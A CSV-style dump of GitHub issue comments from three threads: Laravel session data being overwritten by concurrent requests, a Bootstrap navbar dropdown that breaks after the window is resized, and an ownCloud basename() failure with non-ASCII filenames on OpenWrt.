framework/laravel/8172/104761748,"The issue appears at nearly no concurrent requests. I mean just me testing on homestead. Session is not being saved sometimes. Simplified TL;DR I set session key  to a certain value ( of post) in  route. I have also  where I output the value of . Sometimes the value is old one, I mean session key isn't being saved. Issue remained when we switched to redis as a session driver and enabled config caching. The only solution I figured out, is that now I'm saving its' value in  field on user object and it works fine. ",,False,False,8172
framework/laravel/8172/104762953,@friend can you try to create just a simple GET route that you hit repeatedly with a page refresh until you get the problem? I'm trying to determine if the problem is related to multiple concurrent AJAX requests in certain environments. ,,False,False,8172
framework/laravel/8172/104763381,"I think we're particularly interested in a demo application that can recreate the problem in Homestead using the Redis or Memcached driver. On Fri, May 22, 2015 at 344 PM, Jan Hartigan notifications@friend.com wrote ",,False,False,8172
framework/laravel/8172/104770185,"@friend I reproduced it and as @friend said, it fails when I rapidly hit ""get"" route with browser refresh. Demo app I created a demo app at my local homestead   code Example  How to reproduce Open two tabs as shown on screenshot above. Hit  route once to set random number. Then refresh the same page and then rapidly hit  route (Click ⌘+R several times quickly). Value remains the same (old) in get route. I'll try to record a video now. ",,False,False,8172
framework/laravel/8172/104770755,@friend so just to clarify...you can't replicate the problem without rapid refreshes? ,,False,False,8172
framework/laravel/8172/104771877,@friend I'll tried now (~50 tries) and couldn't. I only replicated when I refreshed  quickly. It seems like the problem occurs when the following happens  started saving to session. ( route) read the value. ( route) finished saving to session. ( route)  ,,False,False,8172
framework/laravel/8172/104772375,"@friend looks suspiciously like the multi-thread problem, but I can't imagine how that would matter when config is being cached. ",,False,False,8172
framework/laravel/8172/104778010,@friend Here's a video I just recorded  Redis Config cached Environment Homestead 2.0.7 ,,False,False,8172
framework/laravel/8172/104779651,"Trying to figure out what you are showing in that video. Are you trying to demonstrate at the end how your value gets stuck on that single integer? On Fri, May 22, 2015 at 426 PM, Levan Velijanashvili  notifications@friend.com wrote ",,False,False,8172
framework/laravel/8172/104782056,"Exactly. Take a closer look at active windows (can be seen using window shadows) and refresh buttons.  I refresh  route. Prints generated random number and sets it to session. Then I gently refresh  route that outputs value from session (see code posted by me above) I repeat this action again and everything still seems to be fine. Then I refresh  route again, quickly switch to  and rapidly hit CMD+R several times. route outputs new random number it set to session. Then I gently refresh  route several times with normal intervals and the see the value is the same as it was in step 3.  ",,False,False,8172
framework/laravel/8172/104783123,"I can't recreate the issue @friend is talking about... I do the cmd + R thing as fast as I can and i see it refreshing, but then if I set a new number to the session, refreshing  again gets the new value correctly. ",,False,False,8172
framework/laravel/8172/104783712,@friend You should start rapidly hitting  before  finishes its work and outputs new value. I'm doing it at 008-018 in the video ,,False,False,8172
framework/laravel/8172/104783820,Did that too... I can't recreate it. ,,False,False,8172
framework/laravel/8172/104783918,"I thought this was solved by switching to redis, but today I was randomly getting this issue as well, not even spamming my system, just generally browsing though it and it came up with TokenMismatchException and the session was gone. ",,False,False,8172
framework/laravel/8172/104784007,1) I did open this page on first window  and this one on the other window  pressed cmd + r on the first window for more than 30 times 4) refreshed the second window and the numbers were different ,,False,False,8172
framework/laravel/8172/104784495,"@friend I think you're doing different thing. You should refresh  to set a new value to session and until it returns the result, you should refresh  several times quickly. During your refreshes the  will set a new value to session (but will fail silently). You continue refreshing  route and the value remains unchanged, i.e.  didn't really set the value to session. /cc @friend ",,False,False,8172
framework/laravel/8172/104784719,I think this thread is sort of becoming a dumping ground for anyone who has any random issue with the session. / ,,False,False,8172
framework/laravel/8172/104785528,@friend your right! did the same test this time and got different numbers ,,False,False,8172
framework/laravel/8172/104863905,"@friend this is not a random issue, the problem is real, and quite annoying, recreated by number of people here. We can go in two directions from here, pretend that there is no problem and continue with our lives, or actually acknowledge its existence and do something about it. ",,False,False,8172
framework/laravel/8172/104870904,Maybe it's a hardware/environment problém ? because I can't reproduce the issue ,,False,False,8172
framework/laravel/8172/104871362,"@friend I think it's from the service that you are using (localtunnel.me) I think it's caching or somthing like that, try at localhost ",,False,False,8172
framework/laravel/8172/104871872,@friend we can reproduce problem on homestead+mac. And ubuntu 12.04 LTS VPS. ,,False,False,8172
framework/laravel/8172/104874009,@friend I really tried many times without any problem  on Windows 8.1 WAMP server ,,False,False,8172
framework/laravel/8172/104889251,"Nobody is denying the problem is real. If you are repeatedly changing the session on each GET request, you're going to possibly get stale data. The only way around that is to makes the sessions totally blocking, which we don't want to do, or to tweak your app to not write to sessions on idempotent requests like GET. On Saturday, May 23, 2015, Ala RIHANE notifications@friend.com wrote ",,False,False,8172
framework/laravel/8172/104889362,"No, I'm not changing anything on  request. I just read data and output it. Session in changed on  request which I hit only once while replicating issue. ",,False,False,8172
framework/laravel/8172/104889411,"What do you mean session is changed? If you do a set request but a get request starts before that request AND then finished after the set, the get request is going to write the stale data back to the session. On Saturday, May 23, 2015, Levan Velijanashvili notifications@friend.com wrote ",,False,False,8172
framework/laravel/8172/104900297,"@friend ""session is changed"" I mean value of a key in session is changed. So that's the problem. I'll paste the code @friend posted in Slack chat yesterday So the problem is that session data is being written back at the end on every request, whether or not session data was changed. So the only fix would be to write back session data only if session data was changed during current request. Note The problem will still occur if we re-read session data at the end of the session. It will see data was changed - it will compare newly read data to one that we read at the beginning, so it will still write back stale data. We should write back session data, only if  (or any other method that changes session data) was called. As @friend says, it will make the expiration stuff complicated. So at this moment I don't know how to avoid this problem. ",,False,False,8172
framework/laravel/8172/104915942,"I understand that expiration stuff can become a problem when session is saved only on change. For year's (before Laravel) I've been using this solution in our company framework. It was used on pages with big traffic, and we didn't experience any problem with sessions being expired due not saving any data to it. I think that this is a risk worth taking. ",,False,False,8172
framework/laravel/8172/104920984,"It is sort of a problem though. If I log into the site and I work in the app all day. I don't want to be logged out every two hours just because my session hasn't changed. That's silly. On Saturday, May 23, 2015, Radosław Mejer notifications@friend.com wrote ",,False,False,8172
framework/laravel/8172/104936713,"And what about the touch() function? Would that still corrupt the file? It would prevent the session going stale, right? if ($dataChanged) {     writeSession(); } else {     touchSession(); }  Or take the time into consideration, only update once a minute? if ($dataChanged || $secsAgoChanged &gt; 60) {     writeSession(); }  Or combine both? if ($dataChanged ) {     writeSession(); } elseif ($secsAgoChanged &gt; 60) {     touchSession(); }  ",,False,False,8172
framework/laravel/8172/104937536,"The seconds thing will be error prone. To me it makes more sense to just evaluate why is the session changing in s particular app and perhaps structure your AJAX calls to where they aren't going to be going in between set requests for the same session. Perhaps use a cookie to store a piece of data, etc On Saturday, May 23, 2015, Barry vd. Heuvel notifications@friend.com wrote ",,False,False,8172
framework/laravel/8172/104939683,@friend What about long-polling? It will screw up thing if someone has long-polling implemented in app. ,,False,False,8172
framework/laravel/8172/104939712,"What will screw up things? On Saturday, May 23, 2015, Levan Velijanashvili notifications@friend.com wrote ",,False,False,8172
framework/laravel/8172/104939832,"This issue. I mean if you change anything in session data, long-polling requests will overwrite stale data to session as each polling request will take up to 40 seconds. ",,False,False,8172
framework/laravel/8172/104940328,"I mean there are several options there. You could send a custom header, check for that header, and then override the session middleware. That's just off the top of my head. I'm not sure of a really great solution that works well in every situation. On Sat, May 23, 2015 at 257 PM, Levan Velijanashvili  notifications@friend.com wrote ",,False,False,8172
framework/laravel/8172/104941503,Also worth mentioning that the near-term future of bidirectional communication likely won't include long-polling unless your app needs to support IE9. ,,False,False,8172
framework/laravel/8172/104948114,"I'm not sure I fully understand the ""expiration"" problem, but if it's a case that the session must save at certain intervals to avoid being logged out, how about using the garbage collection/lottery approach to save the session occasionally? Or maybe just add a session save in the ""gc"" function of the session handler? ",,False,False,8172
framework/laravel/8172/105001530,"@friend when it comes to long-polling it's a big problem, I used to store data from Session data while there is a long-polling ajax request, the Session forget even in the same request, so we suitched to cookies so we didn't faced this problem anymore. ",,False,False,8172
framework/laravel/8172/106015931,Same issue here running L5 on PHP 5.6.9. - TokenMismatchException VerifyCsrfToken.php on line 46 - on every post request. Works fine on PHP 5.4. ,,False,False,8172
framework/laravel/8172/106107793,We are running it on PHP 5.5.24-1 ,,False,False,8172
framework/laravel/8172/106216308,"@friend  Yea, it happens because Session is re-initialized on every request (make sure you have set the domain-name setting in  btw). ",,False,False,8172
framework/laravel/8172/109907029,"We have exactly the same problem. Weird thing is we can not reproduce it ourselves but we have Bugsnag installed and see the tokenmismatch exception pop-up twice per minute or so, completely random. Random users, random computers, random browsers. Only thing in common is that it where all ajax calls. Seems like about 0,1% of all ajax calls return a token mismatch exception, all the ajax calls suffer from this. I know that it has nothing to do with a session expiring because we have one ajax call which is only loaded first thing when a page loads and even this ajax call will return a tokenmismatch exception about 0,1% of the time, again completely random but here at our office we can not reproduce it. If somebody wants access to the Bugsnag report, I can give you that for investigation purposes. Environment AWS Beanstalk (64bit Amazon Linux 2015.03 v1.4.1 running PHP 5.6) Latest Laravel 5.0.x Website www.studocu.com We used to have 1 AWS redis node for both the cache and sessions. Today we tried separating the 2 and moved the session part to a newly setup memcached node, but this didn't make a difference and the problem still exists. ",,False,False,8172
framework/laravel/8172/110199902,"Experiencing this issue with a fresh install of Laravel 5 on a recently provisioned Ubuntu 15.04 server. No matter what route, it's always a token mismatch. Tried both file and database session drivers. I'd be willing to let @friend or @friend or someone else into the server to poke around and see if they can figure it out. ",,False,False,8172
framework/laravel/8172/110202710,@friend -You have a complete session failure - which is a different issue to this thread. Please post that issue in a forum for assistance. ,,False,False,8172
framework/laravel/8172/110356600,"Can people stop abusing this thread and actually read it, and only comment if they have something useful to say. ",,False,False,8172
framework/laravel/8172/110638834,"@friend Was this comment meant for me? If so, how can I provide more information? ",,False,False,8172
framework/laravel/8172/110643354,"@friend Open independent issue for your case, because it is not related to this one (this one = random, unpredictable and untraceable session failures [0.1-0.3% occurrence rate]). ",,False,False,8172
framework/laravel/8172/110650207,"@friend Did you even read my report? I'll quote myself ""Seems like about 0,1% of all ajax calls return a token mismatch exception, all the different ajax calls suffer from this. Random users, random computers, random browsers"". This is caused by a random, unpredictable and untraceable session failure and thus a session regeneration causing random (0,1% of all) ajax calls to return a tokenmismatch. ",,False,False,8172
framework/laravel/8172/112219227,"I had a problem with persisting sessions. (Not sure if its related to this problem). The first time I installed Laravel via installer, then I had problems running phpunit and the weird session persisting problem. Then I reinstalled Laravel via composer and now everything works as expected. Perhaps its a bug in the installer. ",,False,False,8172
framework/laravel/8172/113196198,"I had a problem with session persistence only on live server, but I solved it. The problem was in blank space after php closing tag in my Profile model which I using  for authentication. After I removed it everything is work now. ",,False,False,8172
framework/laravel/8172/113197652,"That is totally unrelated! Also, you should not use php closing tags for that reason. ",,False,False,8172
framework/laravel/8172/113757281,Been following this thread for a while hoping for a solution. I just bumped into a situation which might be related to this. (Using the database session driver) Accidentally I put a wrong route for a form and when I submitted I obviously got a TokenMismatch even on valid routes from time to time on fast AJAX requests or situations where there been many concurrent requests. And after that I've seen this NotFoundHttpException the second time on submitting a form to an invalid route instead of a Not Found page. Is that expected behavior? ,,False,False,8172
framework/laravel/8172/113769854,"CSRF token checks run as part of the global middleware, before you reach the routes. So an invalid CSRF will trigger an exception, regardless of the url. ",,False,False,8172
framework/laravel/8172/113786836,"Yeah I got that, just didn't understand why a csrf exception was triggered after a not found exception the first time. ",,False,False,8172
framework/laravel/8172/113870603,Ok figured that whenever hit a NotFoundHttpExceptionTokenMismatchException♠` is triggered. Is it necessary to clear the session / regenerate the token if a route is not found? ,,False,False,8172
framework/laravel/8172/114047380,"Hi! I have the same problem. The session of my app expired when I do new request. In a local environment that's fell good but in a real hosting the session expires randomly, someone have some hint? ",,False,False,8172
framework/laravel/8172/114053044,I started getting this today after several days of development. Laravel 5.1 Windows 8.1 Google Chrome Version 43.0.2357.124 m PHP Version 5.6.8 Notable information  Only happens on my Chrome browser (Tested latest IE and latest FF) It happens in incognito mode as well I get the error more often than not (About 90% of the time I submit a form) It does not appear to have anything to do with the frequency of form submissions It happens in both prod and local APP_ENV  ,,False,False,8172
framework/laravel/8172/114091231,"I have the same problem and here is how i'm tested and fixed the problem. First, i knew i have some 404 ajax and resources ( javascripts ) on my site. So I logged on the site, and put four tabs opened with my site in firefox. The Firefox has a nice tool called ""Reload all tabs"". So I did it and with a few refresh all tabs I get logout. Then, I removed all 404 requests and tried again, and, after 20 attempts, no logouts from now. ",,False,False,8172
framework/laravel/8172/114099220,"@friend I don't know why it works sometimes, but when I get 'the error' it's because the form is sending a different (Seemingly random) token than what is stored in the session. Are you sure this is not the same issue? ",,False,False,8172
framework/laravel/8172/114099464,"@friend so it's expected behaviour for session and token to get refreshed after a 404? Any reason for that being necessary or that just the way it's made? And some times a 404 is triggered even on valid routes? That's what seems to happen in my environment randomly...it's actually first a ""Whoops something went wrong...notfoundexception"" followed by tokenmismatch...on fast ajax requests...and hence guessed that this could be issue others are facing..and just wanted a way to ensure that even if 404 did come about, the token does not get refreshed...is there any way to ensure that  it doesn't get refreshed on 404 then my problem will be solved at least ;) because I can't figure why I get a notfound sometimes on valid routes, it's rare but happens and then it results in this tokenmismatch.... ",,False,False,8172
framework/laravel/8172/114117821,"@friend What? Why would your session get refreshed after a 404? This is not true, and I've just confirmed in a clean install. Also, that would be a horrible user experience, because users would basically be logged out after visiting a missing page. ",,False,False,8172
framework/laravel/8172/114127648,"@friend Sorry my bad, was getting frustrated about everybody just commenting their issues in here. Of-course a 4xx will not refresh your session. I do not have any reponses other then 200, I do not have concurrent and high frequency ajax calls. No exceptions are being thrown (we log everything on bugsnag). Still once in a while, about 0,1%, a request is returning a tokenmismatch caused by a regeneration of the session (i've actually logged this), not caused by session expiring or any thing like this. We have this problem both on Redis and Memcache. This is actually influencing the user experience on our website! Since this is only happening on our production environment (we can not reproduce the problem on develop or staging). I had to exclude all vital ajax routes from CSRF verification. Since nobody is interested in our bugsnag report or logs it kinda feels like nobody is working on this issue and people are only cluttering this thread with non related issues. This problem is actually costing us users and thus money and is kind of unacceptable. (it is the only laravel issue we are having btw, everything else works like a charm and is awesome!) ",,False,False,8172
framework/laravel/8172/114135568,"@friend - what exactly is your production environment config? i.e .server, os, php version etc? ",,False,False,8172
framework/laravel/8172/114140093,@friend Environment AWS Beanstalk (64bit Amazon Linux 2015.03 v1.4.1 running PHP 5.6) PHP 5.6.8 Apache 2.4.12 Latest Laravel 5.0.x Website www.studocu.com Weird thing is we have a replica of this setup for staging and we can not reproduce it there as well. I guess with just 7 dev's working on staging we do not have enough ajax calls to get a single error. On production though we hundreds of users online at the same second. ,,False,False,8172
framework/laravel/8172/114141996,@friend - so here is an idea; Can you 'duplicate' that AWS environment? Put a copy of your app on it - and confirm the bug still occurs? Then - if you are trusting enough - could you give @friend access and the steps to reproduce (if he is open to the idea - I'm just putting it out there). The biggest issue is the difficulty in replicating the issue. So far we've not been able to get access to an environment where we can duplicate it. I've tried on different cloud providers - and I cant seem to get it to trigger... ,,False,False,8172
framework/laravel/8172/114146210,"@friend - I willing to give it a go, but I don't think it will work. Our staging environment is a duplicate of our production. Like I said before, we can not reproduce the bug ourselves (on both production or staging). The only thing that makes this bug visible is a high user volume website and Bugsnag. I'm guessing more applications suffer from this but they don't even know it. It is only happening about once or twice per hour (random calls, random routes, random users) versus thousands of successful requests. ",,False,False,8172
framework/laravel/8172/114148794,Can you try hitting your staging site with a load tester - like  - can that trigger it? ,,False,False,8172
framework/laravel/8172/114166199,"@friend I doubt that, all our ajax requests are user induced. I should build in a custom ajax request then, which basically does nothing but will load on various times. ",,False,False,8172
framework/laravel/8172/114194201,Same problem here. Randomly. TokenMismatchException line 46. Happens with IE Win8.1 or IOS. Can't reproduce it. Simple form application (html+bootstrap+jqueryui) with default Laravel auth Session store in database Laravel 5.1 PHP 5.5.9 Apache 2.4 Cleared cache etc Session cookie gets reinit every request. Sow GET login page has other session then POST login page. ,,False,False,8172
framework/laravel/8172/114260635,"For me this problem went away when I updated my Homestead machine image from 0.2.6 to 0.2.7, destroyed my machine and recreated it. ",,False,False,8172
framework/laravel/8172/114260875,I solved my problem putting session_start() in the top of my routes file. ,,False,False,8172
framework/laravel/8172/114408185,"@friend I understand your frustration, just wanted to correct the wrong info, as it will only further confuse users reading this thread. I'm subscribed to the issue for the same reason as you - random token mismatch exceptions that cannot be reliably reproduced, though in a Laravel 4.2 app. I'm not posting extra info about my situation since it was mentioned that this issue is specifically concerned with Laravel 5, but I'm watching in case someone figures out the problem, because there's a good chance that the root cause might be similar. ",,False,False,8172
framework/laravel/8172/114418687,Oh wow. NEVER do that! ,,False,False,8172
framework/laravel/8172/114419412,why? That solved my problem ,,False,False,8172
framework/laravel/8172/114419459,Because that's totally incorrect. ,,False,False,8172
framework/laravel/8172/114419551,Closing this as zero progress is being made. ,,False,False,8172
framework/laravel/8172/114419620,"Yes, I know but my desperation  is enough ",,False,False,8172
framework/laravel/8172/114460406,"@friend most people seem to experience this with Homestead. Whatever the issue is, updating homestead solved it on all my machines. BTW I could re-produce this with the most simple imaginable app that subits a form (no ajax). ",,False,False,8172
framework/laravel/8172/114637404,"Not sure how related this is, but I've been playing around with Lumen and with the new 5.1 release, I started migrating and noticed that my sessions kept regenerating on each request.  Tests work fine, but in browser, I couldn't keep a session.  I didn't have this problem w/ the Lumen 5.0 release. For me, it's not random as it is for some people here, it just doesn't keep the session. I updated Homestead to 0.2.7 hoping it would fix the issue, but no luck. I think Lumen is using Laravel's session class, hence posting here. ",,False,False,8172
framework/laravel/8172/115361994,I log the Exception header which show that de TokenMismatch mainly occurs on IE Win8.1 or IOS Safari. I can reproduce it in IE11 when i set the Privacy on High. solution that works here add a customheader in the middleware stack by create a file P3PHeader in App\Http\Middleware; And added 'App\Http\Middleware\P3PHeader' to $middleware in Kernel.php ,,False,False,8172
framework/laravel/8172/115564735,This is only an issue on my local machine and after running  i no longer see the issue ,,False,False,8172
framework/laravel/8172/115569912,"@friend This is looking very promising! For the first time I'm able to reproduce the error myself. Adding the headers like you suggested solved it for me, at least locally. I'm going to hotfix deploy this right away to production and monitor it for a couple of hours. Will be back with the results asap. ",,False,False,8172
framework/laravel/8172/115863701,"@friend Make sure you exclude responses that are redirects, otherwise it will throw an error ",,False,False,8172
framework/laravel/8172/116624606,"@friend @friend Tried both suggestions, random session regenerations still occurs. We are going to upgrade to L5.1 really soon, hopefully things will magically sort itself out. ",,False,False,8172
framework/laravel/8172/116769777,"@friend Do you use apache on your local machine? I run windows 8.1 and just switched to nginx and that also solved the issue for me, just like  did while using apache. ",,False,False,8172
framework/laravel/8172/116772633,Please continue this on the forums. ,,False,False,8172
bootstrap/twbs/11243/21632511,"The default navbar ( act a little bit weird when  I click dropdown (keep it opened) and then resize the browser until the navbar-toggle button appear, click it, open the dropdown and then maximize the browser. after those step, I can't open the dropdown on navbar default state.. ",,False,False,11243
bootstrap/twbs/11243/27148522,What browser are you using? Everything works well on Chrome. ,,False,False,11243
bootstrap/twbs/11243/27150801,"I'm using Google chrome. On my previous bootstrap 3 files, everything works fine, Until I sync it today and replace it (both unminified css &amp; js file). I'm glad I have a backup bootstrap files ) ",,False,False,11243
bootstrap/twbs/11243/27595749,This issue exists for us as well. Same browser. ,,False,False,11243
bootstrap/twbs/11243/27596523,"I think that found the thing causing the bug. No one of browsers can works in all test cases, but this is due to the viewport (dropdown forgets the place where should appear). @friend Please, don't try to kill your browser. This test case is too aggressive. ",,False,False,11243
bootstrap/twbs/11243/27678213,"I've got a trick to avoid the bug appearing when we maximize the browser. default bootstrap markup  the bug appear when we maximize the browser and we have  I've tried to change  class to . and it's works. bootstrap navbar is back to normal. in the end, we would have this markup when our browser is maximized  anyway, this is just a trick. my javascript skill is not yet able to fix this.. ( you can use  for resize event or anything else to manipulate the markup. hope this can solve our problem ) ",,False,False,11243
bootstrap/twbs/11243/28167804,we have the same issue on our site and fixed it by closing the collapse dropdown after resizing the browser through adding this javascript code we also use a good plugin for resizestop event ,,False,False,11243
bootstrap/twbs/11243/28613088,Or try to add ,,False,False,11243
bootstrap/twbs/11243/29131049,"When I add @friend (min-width 768px)  {  .navbar-collapse.in{ overflow-yvisible;} } ""navbar-right"" or ""pull-right"" doesn't work anymore. The solution of Nugrata works fine ",,False,False,11243
bootstrap/twbs/11243/29179092,@friend This problem happens for me using the latest Google Chrome. The finer points of this bug are not about the original navbar drop down but the collapsed navbar drop down. If that is up when you re enlarge the window it's fine. The bug only occurs after clicking on the little three lined icon if you then re enlarge the window while the revealed stacked navbar is still down. ,,False,False,11243
bootstrap/twbs/11243/29180422,Is this now the definitive thread and is there a definitive answer? ,,False,False,11243
bootstrap/twbs/11243/29180429,"Again, sorry @friend. This is an issue about Chrome's viewport resize, and things like this happens on many sites, undependent of framework (like Bootstrap). So, I think that this issue can be closed. How to fix it? Don't play games with your browser's viewport. ",,False,False,11243
bootstrap/twbs/11243/29182443,"@friend I disagree. If I write my website using the bootstrap system and any visitor of my site has a good reason to shrink the window for a while and later regrow the window they have a right to be alarmed and not accused of playing games with their viewport. It is a bug, and even though there may be workarounds, although it's not clear to me what the definitive workaround is, it's not fixed until it's fixed to everyone's satisfaction in a future version of bootstrap. ",,False,False,11243
bootstrap/twbs/11243/29182822,@friend That's all about viewport. You should report bug in Chrome bug tracker. ;) ,,False,False,11243
bootstrap/twbs/11243/29183553,"I think we have a misunderstanding here. The bug I'm referring to is the one I described in the thread that has been closed because it was assumed to be the same a this one. That bug happens exactly the same in Safari, Firefox and Chrome. It is not just a Chrome issue. It is more likely a bootstrap issue. Try the link above to issue #11603 and read my description of the issue. If these issues are at cross purposes perhaps we need to separate them. I originally assumed when it was pointed to me that my issue was a duplicate and that this issue was the same hence why am commenting here now. I think this is definitely a bug in bootstrap and not just a browser issue given that three distinct browsers repeat the same behaviour. ",,False,False,11243
bootstrap/twbs/11243/29183727,I'm not going to close this issue. ,,False,False,11243
bootstrap/twbs/11243/29184084,"@friend I don't know, but it looks like viewport issue (happens when resize window). I know that it can be fixed, but I don't think it's issue directly within Bootstrap. ",,False,False,11243
bootstrap/twbs/11243/29184539,@friend I didn't think you were going to close this thread. I was referring to the closure of #11603. @friend If you can show me a solution that you think works I'll try it out and see. ,,False,False,11243
bootstrap/twbs/11243/29184828,i don't have complete solution. I'm just avoiding window resizing games. smile ,,False,False,11243
bootstrap/twbs/11243/29184929,@friend I'm not finding your suggested solution that clear. I'm new to bootstrap. Would you mind perhaps expanding on what exactly to do and where in order to fix this problem. Right now I can't see the forest for the trees. ,,False,False,11243
bootstrap/twbs/11243/29185097,@friend It's not about what we're doing. We can't avoid what our web site clients are going to do. They are the ones who will get annoyed with our web sites and that's what concerns me. We can't in all seriousness post a directive on our home pages for users to not play silly whatsits with their windows. ,,False,False,11243
bootstrap/twbs/11243/29186439,"I added  as a possible solution. But @friend mentioned this will break ""navbar-right"" and / or ""pull-right"". ",,False,False,11243
bootstrap/twbs/11243/29192969,"What I thought is our problem come when we enlarge our browser but the  class within  is messing the navbar. so that  class got my attention. let's take a look the css file for a while.. I've found some  class related to our problem remembering that we have a trick to change  class to  and it works for me, so i'm interested with @friend (min-width 768px) block rules. Since the  class is our savior, I copied the rules and paste it on  rules. The result's look like this.. With this trick, the default Navbar is working perfectly when we enlarge our browser but we'll get a dropdown opened. I think that's not a big deal since our navbar is back to normal. Hope this trick can solve the problem once again. Please make sure you backed up your file first before trying this trick or you can use another css file to override the rules.. ",,False,False,11243
bootstrap/twbs/11243/29201239,"Everyone concerned about this should get a group of non-developer friends and do not tell them anything is ""wrong"" and see if they discover this. No regular user does this. If a user wants a window out of the way they click minimize. Most users slightly size down pages but if they do, they're not likely to size it down to see the mobile menu then click the toggle in the menu, pause and not click a link in the menu, but instead decide to re-size their page back up again. If it happens between flipping orientations, that's where the problem arises. That is a natural thing to do, even by accident, to click something in a menu, and then flip the device to landscape. ",,False,False,11243
bootstrap/twbs/11243/29221873,"Yup, that's it. 2013/11/25 carasmo notifications@friend.com --  Zlatan Vasović - ZDroid ",,False,False,11243
bootstrap/twbs/11243/29222251,"@friend Thanks. This works for me. I haven't noticed any side effects as yet, have you? An easy confusion in talking about this is that the navbar has a drop down menu in it. Then, when you shrink the window, the navbar itself becomes a drop down. You don't have to drop the drop down inside the dropped down navbar for this problem to happen. If you do, when you re enlarge the scroll bar is there already. With your fix, if you drop the inside drop down while in a shrunken window, it's still dropped when you re enlarge. I don't think that's a problem. If you were looking at it in the shrunken window, it's not a surprise when you re enlarge. I'm very happy with this now. I hope the developers will be too and that there are no side effects. ",,False,False,11243
bootstrap/twbs/11243/29223025,"@friend I disagree. I don't think you should make too many assumptions about ""regular"" users. It's clearly a bug and as such should be fixed, just in case. Let's say you're copying information from one window into another open app where a simple cut and paste is not an option and want these two views side by side. Sometimes shrinking both windows is the only option. And even if the majority of examples where a user was doing something like that might be able to be done another way without shrinking windows - we can't go around and reeducate them on an individual basis. And most people that get upset about stuff like that, don't complain and just go away. I don't want that happening on my web sites. ",,False,False,11243
bootstrap/twbs/11243/29226216,If only we could make open source projects from a user-centered design perspective. ,,False,False,11243
bootstrap/twbs/11243/29227250,"Won't change my mind. Shrinking both menus side by side and then copying pasting are different than deciding to toggle a menu and not click a link in that menu but then decide to just resize the page. Most people will refresh their browser if they happened to do that and discover that things have gone wonky. Hopefully this responsive crap will go away and all media queries will be min-device-width. I've done small menus where it doesn't even kick in unless that user comes to that site at the break point, not a single client says anything because the check their phone, works fine, check their desktop and tablet and it works fine. Just tell 'em it's adaptive, not responsive and move on. ",,False,False,11243
bootstrap/twbs/11243/29244090,"If you feel that way about responsive design why are you contributing to a responsive framework?  I think I am misunderstanding what the purpose of participating in the project is.  I thought it was to help build a better bootstrap, but after a day of auditing these issues it seems like it is more about reddit style bickering over opinions that really aren't germane to the issues. ",,False,False,11243
bootstrap/twbs/11243/29246286,@friend Exactly. You've cut straight to the chase. ,,False,False,11243
bootstrap/twbs/11243/29247074,"BS3 has the BEST grid system ever and the author's are geniuses. That is why. This stuff that regular users will not discover is simply not something that's important at all and after a month of seeing this thread, I just had to say something. I agree with the the test case being too aggressive. It's illogical. If it were a big deal or even a bug IMO, this thread would have more than 9 followers with 2 of them being team members. There would be a lot of plus ones. ",,False,False,11243
bootstrap/twbs/11243/29247815,Man I really don't get it.  I think I'll choose another project to contribute to. ,,False,False,11243
bootstrap/twbs/11243/29248216,"It is indeed an edge case, but one that seems fixable and one that IMHO ought to get fixed. ",,False,False,11243
bootstrap/twbs/11243/29249975,"@friend Why would you do that in response to one individual's opinion? The project itself is a worthy one. @friend I've been supporting various levels of computer user in a variety of contexts over many years and your supposition that a regular user wouldn't stumble on this flaw is just plain wrong. Many regular computer users get very quickly frustrated when software doesn't work as expected and generally being non technical, use software in ways that technical creators often won't appreciate. I may not be a regular user but I only just discovered bootstrap yesterday and this bug came up within a very short time of using it, I was simply checking that it was doing what it claimed to be doing. @friend I agree it's not a major bug but I, like Stephen did not expect to find myself having this discussion here. ",,False,False,11243
bootstrap/twbs/11243/29250120,"I picked 20 issues and read through the threads, started doing research to come up with my first fork.  I'm seeing this attitude across this entire repo.  I really, really like bootstrap and want to contribute, but maybe the popular repos are attracting the wrong crowd?  I don't know, I'm new to this so I think I'll be safer with a smaller project for my first go. ",,False,False,11243
bootstrap/twbs/11243/29251138,Out of curiosity are @friend and @friend contributors? There have been quite a few people interested in this issue. An initial problem was that this interest was spread out over 5 duplicated issues. ,,False,False,11243
bootstrap/twbs/11243/29252153,"Yes, I'm on the core team  has submitted a number of pull requests and legitimate bug reports. ",,False,False,11243
bootstrap/twbs/11243/29263320,"Firstly, I should mention that the OP issue occurs in both static and fixed navbars. A related issue that I'm not yet clear about is that the fixed navbar in collapsed form does not push content down when you drop it. Is that intended? Is it too hard to do otherwise because of its fixed state? Ideally I would like a top of the window navbar that stays fixed and visible at the top but pushes content down when you drop it in its collapsed state. ",,False,False,11243
bootstrap/twbs/11243/29263869,@friend Intended AFAIK. I think it's just the design choice that was made. I don't know if the alternative you're proposing was ever considered. ,,False,False,11243
bootstrap/twbs/11243/29272245,"I found a reason of bug. When you open a dropdown, resize window, uncollapse navbar, open dropdown and resize window again you'll get a  on . When remove that dummy  attribute you'll be able to see dropdown, again. ",,False,False,11243
bootstrap/twbs/11243/29349419,"I have spent many hours trying to figure out what is happening here, and I'm not on the core team, so it is definitely not a completely obscure thing that is unlikely to happen to real people. Hope it gets fixed in a future release. ",,False,False,11243
bootstrap/twbs/11243/29363185,"@friend If I found a real way to implement this fix, I'll send a pull request. ) ",,False,False,11243
bootstrap/twbs/11243/29363666,"Thank you @friend. I got a workaround on StackOverflow (with link to this thread), but I wish I did not have to spend so many hours trying to figure out what was going on. Hope it will help others, too. ",,False,False,11243
bootstrap/twbs/11243/29548073,Closing for #11653. ,,False,False,11243
core/owncloud/2932/13192509,"I have successfully installed OwnCloud 5.0.4 on WRT1043ND router running OpenWrt Attitude Adjustment 12.09-rc2 image. The only grave issue I had was inability to save and sync filenames with international characters. The problem stems to standard php basename() implementation which only works if setlocale can be set correctly to en_US.UTF-8. Unfortunately, many embedded systems, including OpenWRT and ddwrt, do not have locale support at all. Files and folders are created successfully on disk, but oc_filecache has [name] field populated incorrectly for example folder with full path ""/clientsync/яшерąčęéíñ"" is set with name ""clientsync"", a filename with full path ""/clientsync/яшерąčęéíñ.txt"" will become just "".txt"". As a result, Files web UI points to non existing path, and Sabre WebDAV has same issue propagated from /lib/connector/sabre/node.php, since file full path is reconstructed as folder name . ""/"" . [name]. After I have replaced the references to basename() function to my custom basename_safe() one in /lib/base.php, OwnCloud has started working without a hitch function basename_safe($path, $suffix=null) {     $path = rtrim($path,'/');     $path = explode('/',$path);     return end($path); } By the way, Sabre made a design choice not to use standard basename(), it has it's own solution for basename() Sabre_DAV_URLUtil-&gt;splitPath(). Is it possible to have a configuration variable, which would switch to alternative basename() implementation for the purpose of running OwnCloud on embedded systems? ",,False,False,2932
